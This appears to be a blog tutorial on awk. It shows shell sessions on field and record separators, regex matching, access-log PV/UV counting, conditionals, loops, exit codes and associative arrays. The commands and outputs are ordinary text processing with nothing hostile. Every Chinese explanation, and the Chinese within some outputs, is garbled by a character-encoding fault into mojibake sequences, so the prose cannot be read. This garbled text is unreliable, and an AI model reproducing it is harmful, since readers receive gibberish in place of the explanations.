<p><strong>æŠŠORSç†è§£æˆRSåè¿‡ç¨‹ï¼Œè¿™æ ·æ›´å®¹æ˜“è®°å¿†å’Œç†è§£</strong>ï¼Œçœ‹ä¸‹é¢çš„ä¾‹å­ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;BEGIN&#123;ORS=&quot;\n&quot;&#125;&#123;print $0&#125;&#x27;</span> test1 //awk <span class="string">&#x27;&#123;print $0&#125;&#x27;</span> test1äºŒè€…æ˜¯ä¸€æ ·çš„</span><br><span class="line">111 222</span><br><span class="line">333 444</span><br><span class="line">555 666</span><br><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;BEGIN&#123;ORS=&quot;|&quot;&#125;&#123;print $0&#125;&#x27;</span> test1 </span><br><span class="line">111 222|333 444|555 666|[root@rocky8:~]# </span><br></pre></td></tr></table></figure>
<p><strong>äºŒï¼ŒFSä¸OFS</strong>ï¼ˆä¸ç†è§£ï¼‰</p>
<p>1ï¼ŒFSæŒ‡å®šåˆ—åˆ†å‰²ç¬¦</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">echo</span> <span class="string">&quot;111|222|333&quot;</span>|awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> </span><br><span class="line">111|222|333</span><br><span class="line">[root@rocky8:~]# <span class="built_in">echo</span> <span class="string">&quot;111|222|333&quot;</span>|awk <span class="string">&#x27;BEGIN&#123;FS=&quot;|&quot;&#125;&#123;print $1&#125;&#x27;</span> </span><br><span class="line">111</span><br></pre></td></tr></table></figure>
<p>2ï¼ŒFSä¹Ÿå¯ä»¥ç”¨æ­£åˆ™</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">echo</span> <span class="string">&quot;111||222|333&quot;</span>|awk <span class="string">&#x27;BEGIN&#123;FS=&quot;[|]+&quot;&#125;&#123;print $1&#125;&#x27;</span>  </span><br><span class="line">111</span><br></pre></td></tr></table></figure>
<p>3ï¼ŒFSä¸ºç©ºçš„æ—¶å€™ï¼ˆä¸ç†è§£ä¸ºå•¥è¦NF++ï¼‰</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">echo</span> <span class="string">&quot;111|222|333&quot;</span>|awk <span class="string">&#x27;BEGIN&#123;FS=&quot;&quot;&#125;&#123;NF++;print $0&#125;&#x27;</span></span><br><span class="line">1 1 1 | 2 2 2 | 3 3 3 </span><br></pre></td></tr></table></figure>
<p><strong>å½“FSä¸ºç©ºçš„æ—¶å€™ï¼Œawkä¼šæŠŠä¸€è¡Œä¸­çš„æ¯ä¸ªå­—ç¬¦ï¼Œå½“æˆä¸€åˆ—æ¥å¤„ç†</strong>ã€‚</p>
<p>4ï¼ŒRSè¢«è®¾å®šæˆé\næ—¶ï¼Œ\nä¼šæˆFSåˆ†å‰²ç¬¦ä¸­çš„ä¸€ä¸ª</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">cat</span> test1</span><br><span class="line">111 222</span><br><span class="line">333 444</span><br><span class="line">555 666</span><br><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;BEGIN&#123;RS=&quot;444&quot;;&#125;&#123;print $2,$3&#125;&#x27;</span> test1</span><br><span class="line">222 333</span><br><span class="line">666</span><br></pre></td></tr></table></figure>
<p><strong>222å’Œ333ä¹‹é—´æ˜¯æœ‰ä¸€ä¸ª\nçš„ï¼Œå½“RSè®¾å®šæˆ444åï¼Œ222å’Œ333è¢«è®¤å®šæˆåŒä¸€è¡Œçš„äºŒåˆ—äº†ï¼Œå…¶å®æŒ‰å¸¸è§„æ€æƒ³æ˜¯äºŒè¡Œçš„ä¸€åˆ—æ‰å¯¹</strong>ã€‚</p>
<p>5ï¼ŒOFSåˆ—è¾“å‡ºåˆ†éš”ç¬¦</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;BEGIN&#123;OFS=&quot;|&quot;;&#125;&#123;print $1,$2&#125;&#x27;</span> test1</span><br><span class="line">111|222</span><br><span class="line">333|444</span><br><span class="line">555|666</span><br><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;BEGIN&#123;OFS=&quot;|&quot;;&#125;&#123;print $1 OFS $2&#125;&#x27;</span> test1  </span><br><span class="line">111|222</span><br><span class="line">333|444</span><br><span class="line">555|666</span><br></pre></td></tr></table></figure>
<p><strong>test1åªæœ‰äºŒåˆ—ï¼Œå¦‚æœ100åˆ—ï¼Œéƒ½å†™å‡ºæ¥å¤ªéº»çƒ¦äº†å§ã€‚</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;BEGIN&#123;OFS=&quot;|&quot;;&#125;&#123;print $0&#125;&#x27;</span> test1  </span><br><span class="line">111 222</span><br><span class="line">333 444</span><br><span class="line">555 666</span><br><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;BEGIN&#123;OFS=&quot;|&quot;;&#125;&#123;NF=NF;print $0&#125;&#x27;</span> test1 </span><br><span class="line">111|222</span><br><span class="line">333|444</span><br><span class="line">555|666</span><br></pre></td></tr></table></figure>
<p>ä¸ºä»€ä¹ˆç¬¬äºŒç§æ–¹æ³•ä¸­çš„OFSç”Ÿæ•ˆå‘¢ï¼Ÿä¸ªäººè§‰å¾—ï¼Œ<strong>awkè§‰æŸ¥åˆ°åˆ—æœ‰æ‰€å˜åŒ–æ—¶ï¼Œå°±ä¼šè®©OFSç”Ÿæ•ˆ</strong>ï¼Œæ²¡å˜åŒ–ç›´æ¥è¾“å‡ºäº†ã€‚</p>
<p>æ­¤éƒ¨åˆ†è½¬è‡ªï¼š<strong>æµ·åº•è‹é¹°ï¼š</strong><a href="http://blog.51yip.com/shell/1151.html">awkä¸­RS,ORS,FS,OFSåŒºåˆ«ä¸è”ç³»</a></p>
<h4 id="æ­£åˆ™å­—ç¬¦ä¸²åŒ¹é…">æ­£åˆ™å­—ç¬¦ä¸²åŒ¹é…</h4>
<p><strong>~ è¡¨ç¤ºæ¨¡å¼å¼€å§‹ã€‚// ä¸­æ˜¯æ¨¡å¼ã€‚</strong></p>
<p>è¾“å‡ºç¬¬äºŒåˆ—åŒ…å« â€œthâ€ï¼Œå¹¶æ‰“å°ç¬¬äºŒåˆ—ä¸ç¬¬å››åˆ—ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;$2 ~ /th/ &#123;print $2,$4&#125;&#x27;</span> <span class="built_in">log</span> </span><br><span class="line">this a</span><br></pre></td></tr></table></figure>
<p>è¾“å‡ºåŒ…å«&quot;re&quot;çš„è¡Œï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;/re/ &#123;print $0&#125;&#x27;</span> <span class="built_in">log</span> </span><br><span class="line">3 Are you like awk</span><br><span class="line">10 There are orange,apple,mongo</span><br></pre></td></tr></table></figure>
<p><strong>!è¡¨ç¤ºå–å</strong></p>
<p>è¾“å‡ºç¬¬äºŒåˆ—ä¸åŒ…å« â€œthâ€ï¼Œå¹¶æ‰“å°ç¬¬äºŒåˆ—ä¸ç¬¬å››åˆ—ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;$2 !~ /th/ &#123;print $0&#125;&#x27;</span> <span class="built_in">log</span> </span><br><span class="line">3 Are you like awk</span><br><span class="line">This<span class="string">&#x27;s a test</span></span><br><span class="line"><span class="string">10 There are orange,apple,mongo</span></span><br></pre></td></tr></table></figure>
<p>è¾“å‡ºä¸åŒ…å«&quot;re&quot;çš„è¡Œï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;!/re/ &#123;print $0&#125;&#x27;</span> <span class="built_in">log</span> </span><br><span class="line">2 this is a <span class="built_in">test</span></span><br><span class="line">This<span class="string">&#x27;s a test</span></span><br></pre></td></tr></table></figure>
<h4 id="ä¸€äº›å®ä¾‹">ä¸€äº›å®ä¾‹</h4>
<p><strong>è®¡ç®—æ–‡ä»¶å¤§å°</strong></p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="keyword">ls</span> -<span class="keyword">l</span> | awk &#x27;&#123;<span class="keyword">sum</span>+=<span class="variable">$5&#125;</span>END&#123;<span class="keyword">print</span> <span class="keyword">sum</span>&#125;&#x27;</span><br><span class="line">1066</span><br></pre></td></tr></table></figure>
<p><strong>ä»æ–‡ä»¶ä¸­æ‰¾å‡ºé•¿åº¦å¤§äº80çš„è¡Œ</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">awk <span class="string">&#x27;length&gt;80&#x27;</span> <span class="built_in">log</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">seq</span> 100|sed <span class="string">&quot;:a;N;s/\n//g;ta&quot;</span> &gt;&gt; <span class="built_in">log</span></span><br><span class="line">[root@rocky8:~]# <span class="built_in">cat</span> <span class="built_in">log</span></span><br><span class="line">2 this is a <span class="built_in">test</span></span><br><span class="line">3 Are you like awk</span><br><span class="line">This<span class="string">&#x27;s a test</span></span><br><span class="line"><span class="string">10 There are orange,apple,mongo</span></span><br><span class="line"><span class="string">123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100</span></span><br><span class="line"><span class="string">[root@rocky8:~]# awk &#x27;</span>length&gt;80<span class="string">&#x27; log</span></span><br><span class="line"><span class="string">123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100</span></span><br></pre></td></tr></table></figure>
<p><strong>æ‰“å°ä¹ä¹ä¹˜æ³•è¡¨</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">seq</span> 9 | sed <span class="string">&#x27;H;g&#x27;</span> | awk -v RS=<span class="string">&#x27;&#x27;</span> <span class="string">&#x27;&#123;for(i=1;i&lt;=NF;i++)printf(&quot;%dx%d=%d%s&quot;, i, NR, i*NR, i==NR?&quot;\n&quot;:&quot;\t&quot;)&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p><strong>è®¿é—®æ—¥å¿—åˆ†æ</strong></p>
<p>æ—¥å¿—æ ¼å¼</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">head</span> access.log -n1</span><br><span class="line">42.236.10.75 <span class="string">&quot;changtou.xiaoxiaoming.xyz&quot;</span> [14/Oct/2019:12:47:18 +0800] <span class="string">&quot;GET /logo/8@3x.png HTTP/1.1&quot;</span> 200 26053 <span class="string">&quot;https://changtou.xiaoxiaoming.xyz/&quot;</span> <span class="string">&quot;Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; EML-AL00 Build/HUAWEIEML-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 baidu.sogo.uc.UCBrowser/11.9.4.974 UWS/2.13.1.48 Mobile Safari/537.36 AliApp(DingTalk/4.5.11) com.alibaba.android.rimet/10487439 Channel/227200 language/zh-CN&quot;</span> <span class="string">&quot;42.236.10.75&quot;</span> rt=<span class="string">&quot;0.000&quot;</span> uct=<span class="string">&quot;-&quot;</span> uht=<span class="string">&quot;-&quot;</span> urt=<span class="string">&quot;-&quot;</span></span><br></pre></td></tr></table></figure>
<p>ç¤ºä¾‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1.æ•°æ®æ¸…æ´—</span><br><span class="line">awk <span class="string">&#x27;($6 ~ /.html/) &amp;&amp; ($8 ~ /200/)  &#123;print $0&#125;&#x27;</span> access.log &gt; clean.log</span><br><span class="line"></span><br><span class="line">2.ç»Ÿè®¡PV</span><br><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;&#123;print $0&#125;&#x27;</span>  clean.log | <span class="built_in">wc</span> -l</span><br><span class="line">700</span><br><span class="line">[root@rocky8:~]# <span class="built_in">cut</span> -d <span class="string">&#x27; &#x27;</span> -f 1 clean.log|<span class="built_in">wc</span> -l    </span><br><span class="line">700</span><br><span class="line"></span><br><span class="line">3:UV</span><br><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>  clean.log |<span class="built_in">sort</span>|<span class="built_in">uniq</span>| <span class="built_in">wc</span> -l</span><br><span class="line">155</span><br><span class="line">[root@rocky8:~]# <span class="built_in">cut</span> -d <span class="string">&#x27; &#x27;</span> -f 1 clean.log|<span class="built_in">sort</span>|<span class="built_in">uniq</span>| <span class="built_in">wc</span> -l</span><br><span class="line">155</span><br><span class="line"></span><br><span class="line">4:è·å–æ¯å¤©è®¿é—®ç½‘ç«™æœ€å¤šçš„å‰10åç”¨æˆ·</span><br><span class="line">awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> clean.log|<span class="built_in">sort</span>|<span class="built_in">uniq</span> -c|<span class="built_in">sort</span> -k 1nr|<span class="built_in">head</span></span><br><span class="line">æˆ–</span><br><span class="line"><span class="built_in">cut</span> -d <span class="string">&#x27; &#x27;</span> -f 1 clean.log|<span class="built_in">sort</span>|<span class="built_in">uniq</span> -c|<span class="built_in">sort</span> -k 1nr|<span class="built_in">head</span></span><br></pre></td></tr></table></figure>
<h3 id="awkç¼–ç¨‹">awkç¼–ç¨‹</h3>
<h4 id="æ¡ä»¶è¯­å¥IF-ELSE">æ¡ä»¶è¯­å¥IF&amp;ELSE</h4>
<p>IF æ¡ä»¶è¯­å¥è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (condition)</span><br><span class="line">    action</span><br></pre></td></tr></table></figure>
<p>ä¹Ÿå¯ä»¥ä½¿ç”¨èŠ±æ‹¬å·æ¥æ‰§è¡Œä¸€ç»„æ“ä½œï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (condition)</span><br><span class="line">&#123;</span><br><span class="line">    action-1</span><br><span class="line">    action-2</span><br><span class="line">    .</span><br><span class="line">    .</span><br><span class="line">    action-n</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åˆ¤æ–­æ•°å­—æ˜¯å¥‡æ•°è¿˜æ˜¯å¶æ•°ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;BEGIN &#123;num = 10; if (num % 2 == 0) printf &quot;%d æ˜¯å¶æ•°\n&quot;, num &#125;&#x27;</span></span><br><span class="line">10 æ˜¯å¶æ•°</span><br></pre></td></tr></table></figure>
<p>IF - ELSE æ¡ä»¶è¯­å¥è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (condition)</span><br><span class="line">    action-1</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    action-2</span><br><span class="line">1234</span><br></pre></td></tr></table></figure>
<p>åœ¨æ¡ä»¶è¯­å¥ condition ä¸º true æ—¶åªéœ€ action-1ï¼Œå¦åˆ™æ‰§è¡Œ action-2ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;BEGIN &#123;</span></span><br><span class="line"><span class="string">&gt;     num = 11; </span></span><br><span class="line"><span class="string">&gt;     if (num % 2 == 0) printf &quot;%d æ˜¯å¶æ•°\n&quot;, num; </span></span><br><span class="line"><span class="string">&gt;     else printf &quot;%d æ˜¯å¥‡æ•°\n&quot;, num </span></span><br><span class="line"><span class="string">&gt; &#125;&#x27;</span></span><br><span class="line">11 æ˜¯å¥‡æ•°</span><br><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;BEGIN &#123;num = 11; if (num % 2 == 0) printf &quot;%d æ˜¯å¶æ•°\n&quot;, num; else printf &quot;%d æ˜¯å¥‡æ•°\n&quot;, num &#125;&#x27;</span></span><br><span class="line">11 æ˜¯å¥‡æ•°</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥åˆ›å»ºå¤šä¸ª IF - ELSE æ ¼å¼çš„åˆ¤æ–­è¯­å¥æ¥å®ç°å¤šä¸ªæ¡ä»¶çš„åˆ¤æ–­ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ awk <span class="string">&#x27;BEGIN &#123;</span></span><br><span class="line"><span class="string">a=30;</span></span><br><span class="line"><span class="string">if (a==10)</span></span><br><span class="line"><span class="string">  print &quot;a = 10&quot;;</span></span><br><span class="line"><span class="string">else if (a == 20)</span></span><br><span class="line"><span class="string">  print &quot;a = 20&quot;;</span></span><br><span class="line"><span class="string">else if (a == 30)</span></span><br><span class="line"><span class="string">  print &quot;a = 30&quot;;</span></span><br><span class="line"><span class="string">&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>è¾“å‡ºç»“æœï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;BEGIN &#123;</span></span><br><span class="line"><span class="string">&gt; a=30;</span></span><br><span class="line"><span class="string">&gt; if (a==10)</span></span><br><span class="line"><span class="string">&gt;   print &quot;a = 10&quot;;</span></span><br><span class="line"><span class="string">&gt; else if (a == 20)</span></span><br><span class="line"><span class="string">&gt;   print &quot;a = 20&quot;;</span></span><br><span class="line"><span class="string">&gt; else if (a == 30)</span></span><br><span class="line"><span class="string">&gt;   print &quot;a = 30&quot;;</span></span><br><span class="line"><span class="string">&gt; &#125;&#x27;</span></span><br><span class="line">a = 30</span><br></pre></td></tr></table></figure>
<h4 id="å¾ªç¯è¯­å¥For-While">å¾ªç¯è¯­å¥For&amp;While</h4>
<p>For å¾ªç¯çš„è¯­æ³•å¦‚ä¸‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (initialisation; condition; increment/decrement)</span><br><span class="line">    action</span><br></pre></td></tr></table></figure>
<p>ä¸‹é¢çš„ä¾‹å­ä½¿ç”¨ For å¾ªç¯è¾“å‡ºæ•°å­— 1 è‡³ 5ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python@ubuntu:~/test$ awk <span class="string">&#x27;BEGIN &#123; for (i = 1; i &lt;= 5; ++i) print i &#125;&#x27;</span></span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td></tr></table></figure>
<p>While å¾ªç¯çš„è¯­æ³•å¦‚ä¸‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (condition)</span><br><span class="line">    action</span><br></pre></td></tr></table></figure>
<p>ä¸‹é¢æ˜¯ä½¿ç”¨ While å¾ªç¯è¾“å‡ºæ•°å­— 1 åˆ° 5 çš„ä¾‹å­ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python@ubuntu:~/test$ awk <span class="string">&#x27;BEGIN &#123;i = 1; while (i &lt; 6) &#123; print i; ++i &#125; &#125;&#x27;</span></span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td></tr></table></figure>
<p>åœ¨ä¸‹é¢çš„ç¤ºä¾‹å­ä¸­ï¼Œå½“è®¡ç®—çš„å’Œå¤§äº 50 çš„æ—¶å€™ä½¿ç”¨ break ç»“æŸå¾ªç¯ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ awk <span class="string">&#x27;BEGIN &#123;</span></span><br><span class="line"><span class="string">   sum = 0; for (i = 0; i &lt; 20; ++i) &#123; </span></span><br><span class="line"><span class="string">      sum += i; if (sum &gt; 50) break; else print &quot;Sum =&quot;, sum </span></span><br><span class="line"><span class="string">   &#125; </span></span><br><span class="line"><span class="string">&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>è¾“å‡ºç»“æœä¸ºï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python@ubuntu:~/test$ awk <span class="string">&#x27;BEGIN &#123;</span></span><br><span class="line"><span class="string">&gt;    sum = 0; for (i = 0; i &lt; 20; ++i) &#123; </span></span><br><span class="line"><span class="string">&gt;       sum += i; if (sum &gt; 50) break; else print &quot;Sum =&quot;, sum </span></span><br><span class="line"><span class="string">&gt;    &#125; </span></span><br><span class="line"><span class="string">&gt; &#125;&#x27;</span></span><br><span class="line">Sum = 0</span><br><span class="line">Sum = 1</span><br><span class="line">Sum = 3</span><br><span class="line">Sum = 6</span><br><span class="line">Sum = 10</span><br><span class="line">Sum = 15</span><br><span class="line">Sum = 21</span><br><span class="line">Sum = 28</span><br><span class="line">Sum = 36</span><br><span class="line">Sum = 45</span><br></pre></td></tr></table></figure>
<p>Continue è¯­å¥ç”¨äºåœ¨å¾ªç¯ä½“å†…éƒ¨ç»“æŸæœ¬æ¬¡å¾ªç¯ï¼Œä»è€Œç›´æ¥è¿›å…¥ä¸‹ä¸€æ¬¡å¾ªç¯è¿­ä»£ã€‚</p>
<p>ä¸‹é¢çš„ä¾‹å­è¾“å‡º 1 åˆ° 20 ä¹‹é—´çš„å¶æ•°ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python@ubuntu:~/test$ awk <span class="string">&#x27;BEGIN &#123;for (i = 1; i &lt;= 20; ++i) &#123;if (i % 2 == 0) print i ; else continue&#125; &#125;&#x27;</span></span><br><span class="line">2</span><br><span class="line">4</span><br><span class="line">6</span><br><span class="line">8</span><br><span class="line">10</span><br><span class="line">12</span><br><span class="line">14</span><br><span class="line">16</span><br><span class="line">18</span><br><span class="line">20</span><br></pre></td></tr></table></figure>
<p>Exit ç”¨äºç»“æŸè„šæœ¬ç¨‹åºçš„æ‰§è¡Œã€‚</p>
<p>è¯¥å‡½æ•°æ¥å—ä¸€ä¸ªæ•´æ•°ä½œä¸ºå‚æ•°è¡¨ç¤º AWK è¿›ç¨‹ç»“æŸçŠ¶æ€ã€‚ å¦‚æœæ²¡æœ‰æä¾›è¯¥å‚æ•°ï¼Œå…¶é»˜è®¤çŠ¶æ€ä¸º 0ã€‚</p>
<p>ä¸‹é¢ä¾‹å­ä¸­å½“å’Œå¤§äº 50 æ—¶ç»“æŸ AWK ç¨‹åºã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ awk <span class="string">&#x27;BEGIN &#123;</span></span><br><span class="line"><span class="string">   sum = 0; for (i = 0; i &lt; 20; ++i) &#123;</span></span><br><span class="line"><span class="string">      sum += i; if (sum &gt; 50) exit(10); else print &quot;Sum =&quot;, sum </span></span><br><span class="line"><span class="string">   &#125; </span></span><br><span class="line"><span class="string">&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>è¾“å‡ºç»“æœä¸ºï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python@ubuntu:~/test$ awk <span class="string">&#x27;BEGIN &#123;</span></span><br><span class="line"><span class="string">&gt;    sum = 0; for (i = 0; i &lt; 20; ++i) &#123;</span></span><br><span class="line"><span class="string">&gt;       sum += i; if (sum &gt; 50) exit(10); else print &quot;Sum =&quot;, sum </span></span><br><span class="line"><span class="string">&gt;    &#125; </span></span><br><span class="line"><span class="string">&gt; &#125;&#x27;</span></span><br><span class="line">Sum = 0</span><br><span class="line">Sum = 1</span><br><span class="line">Sum = 3</span><br><span class="line">Sum = 6</span><br><span class="line">Sum = 10</span><br><span class="line">Sum = 15</span><br><span class="line">Sum = 21</span><br><span class="line">Sum = 28</span><br><span class="line">Sum = 36</span><br><span class="line">Sum = 45</span><br><span class="line">python@ubuntu:~/test$ <span class="built_in">echo</span> $?</span><br><span class="line">10</span><br></pre></td></tr></table></figure>
<h4 id="awkæ•°ç»„">awkæ•°ç»„</h4>
<p>AWKçš„æ•°ç»„åº•å±‚æ•°æ®ç»“æ„æ˜¯æ•£åˆ—è¡¨ï¼Œç´¢å¼•å¯ä»¥æ˜¯æ•°å­—æˆ–å­—ç¬¦ä¸²ã€‚</p>
<p>æ•°ç»„ä½¿ç”¨çš„è¯­æ³•æ ¼å¼ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">array_name[index]=value</span><br></pre></td></tr></table></figure>
<p>åˆ›å»ºæ•°ç»„å¹¶è®¿é—®æ•°ç»„å…ƒç´ ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ awk <span class="string">&#x27;BEGIN &#123;</span></span><br><span class="line"><span class="string">sites[&quot;taobao&quot;]=&quot;www.taobao.com&quot;;</span></span><br><span class="line"><span class="string">sites[&quot;google&quot;]=&quot;www.google.com&quot;</span></span><br><span class="line"><span class="string">print sites[&quot;taobao&quot;] &quot;\n&quot; sites[&quot;google&quot;]</span></span><br><span class="line"><span class="string">&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>åˆ é™¤æ•°ç»„å…ƒç´ è¯­æ³•æ ¼å¼ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">delete array_name[index]</span><br></pre></td></tr></table></figure>
<p>ä¸‹é¢çš„ä¾‹å­ä¸­ï¼Œæ•°ç»„ä¸­çš„ google å…ƒç´ è¢«åˆ é™¤ï¼ˆåˆ é™¤å‘½ä»¤æ²¡æœ‰è¾“å‡ºï¼‰ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ awk <span class="string">&#x27;BEGIN &#123;</span></span><br><span class="line"><span class="string">sites[&quot;taobao&quot;]=&quot;www.taobao.com&quot;;</span></span><br><span class="line"><span class="string">sites[&quot;google&quot;]=&quot;www.google.com&quot;</span></span><br><span class="line"><span class="string">delete sites[&quot;google&quot;];</span></span><br><span class="line"><span class="string">print sites[&quot;google&quot;]</span></span><br><span class="line"><span class="string">&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>AWK æœ¬èº«ä¸æ”¯æŒå¤šç»´æ•°ç»„ï¼Œä¸è¿‡æˆ‘ä»¬å¯ä»¥å¾ˆå®¹æ˜“åœ°ä½¿ç”¨ä¸€ç»´æ•°ç»„æ¨¡æ‹Ÿå®ç°å¤šç»´æ•°ç»„ã€‚</p>
<p>å¦‚ä¸‹ç¤ºä¾‹ä¸ºä¸€ä¸ª 3x3 çš„ä¸‰ç»´æ•°ç»„ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">100 200 300</span><br><span class="line">400 500 600</span><br><span class="line">700 800 900</span><br></pre></td></tr></table></figure>
<p>ä»¥ä¸Šå®ä¾‹ä¸­ï¼Œ<code>array[0][0]</code> å­˜å‚¨ 100ï¼Œ<code>array[0][1]</code> å­˜å‚¨ 200 ï¼Œä¾æ¬¡ç±»æ¨ã€‚ä¸ºäº†åœ¨ <code>array[0][0]</code> å¤„å­˜å‚¨ 100, å¯ä»¥ä½¿ç”¨å­—ç¬¦ä¸²0,0 ä½œä¸ºç´¢å¼•ï¼š array[â€œ0,0â€] = 100ã€‚</p>
<p>ä¸‹é¢æ˜¯æ¨¡æ‹ŸäºŒç»´æ•°ç»„çš„ä¾‹å­ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ awk <span class="string">&#x27;BEGIN &#123;</span></span><br><span class="line"><span class="string">array[&quot;0,0&quot;] = 100;</span></span><br><span class="line"><span class="string">array[&quot;0,1&quot;] = 200;</span></span><br><span class="line"><span class="string">array[&quot;0,2&quot;] = 300;</span></span><br><span class="line"><span class="string">array[&quot;1,0&quot;] = 400;</span></span><br><span class="line"><span class="string">array[&quot;1,1&quot;] = 500;</span></span><br><span class="line"><span class="string">array[&quot;1,2&quot;] = 600;</span></span><br><span class="line"><span class="string"># è¾“å‡ºæ•°ç»„å…ƒç´ </span></span><br><span class="line"><span class="string">print &quot;array[0,0] = &quot; array[&quot;0,0&quot;];</span></span><br><span class="line"><span class="string">print &quot;array[0,1] = &quot; array[&quot;0,1&quot;];</span></span><br><span class="line"><span class="string">print &quot;array[0,2] = &quot; array[&quot;0,2&quot;];</span></span><br><span class="line"><span class="string">print &quot;array[1,0] = &quot; array[&quot;1,0&quot;];</span></span><br><span class="line"><span class="string">print &quot;array[1,1] = &quot; array[&quot;1,1&quot;];</span></span><br><span class="line"><span class="string">print &quot;array[1,2] = &quot; array[&quot;1,2&quot;];</span></span><br><span class="line"><span class="string">&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>æ‰§è¡Œä¸Šé¢çš„å‘½ä»¤å¯ä»¥å¾—åˆ°å¦‚ä¸‹ç»“æœï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">array[0,0] = 100</span><br><span class="line">array[0,1] = 200</span><br><span class="line">array[0,2] = 300</span><br><span class="line">array[1,0] = 400</span><br><span class="line">array[1,1] = 500</span><br><span class="line">array[1,2] = 600</span><br></pre></td></tr></table></figure>
